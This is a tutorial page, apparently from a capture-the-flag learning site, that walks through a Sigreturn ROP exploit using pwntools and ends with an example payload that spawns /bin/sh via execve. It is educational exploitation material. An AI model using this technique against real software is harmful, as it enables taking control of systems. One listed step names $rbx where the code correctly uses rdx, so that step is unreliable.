This guide shows you how to perform a Sigreturn ROP (SROP) attack.

## Identify available gadgets
Check for gadgets using `ROPgadget --binary ./vuln | grep "<register>"`.

If there are no easy-to-use `$rax` or `syscall` gadgets, SROP attacks may not be the correct attack to use.

## Locating `/bin/sh`

Refer to the associated guide to find or add a `/bin/sh` string to the program.

## Find offset to return address

Find the offset from your buffer to the return address.

<LinkCard title="Finding offsets to return addresses" href="/pwn/guides/cyclic/" description="Guide to finding offset from a buffer to the return address"/>

## Build payload
You will need to do set `$rax` to `15`/`0xf` in your payload, then call a `syscall` gadget.

Afterward, create an instance of pwntool's `SigreturnFrame`. Then, in no particular order:
- Get the frame to change `$rax` to `59`/`0x3b`
- Get the frame to change `$rdi` to the address of a `/bin/sh` string
- Get the frame to change `$rsi` to `0`/`0x0`
- Get the frame to change `$rbx` to `0`/`0x0`
- Get the frame to change `$rip` to the address of a `syscall` gadget.

<Aside type="tip">
    The `SigreturnFrame` class expects numbers, so there is no need to wrap your values in `p64()`.
</Aside>

Afterward, convert the object into bytes with `bytes(frame)` and append it into your payload. Here is an example payload:

```python
payload = b"A" * 72
payload += p64(rop.rax.address)
payload += p64(0xf)
payload += p64(rop.syscall.address)

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = BINSH
frame.rsi = 0x0
frame.rdx = 0x0
frame.rip = rop.syscall.address

payload += bytes(frame)
```
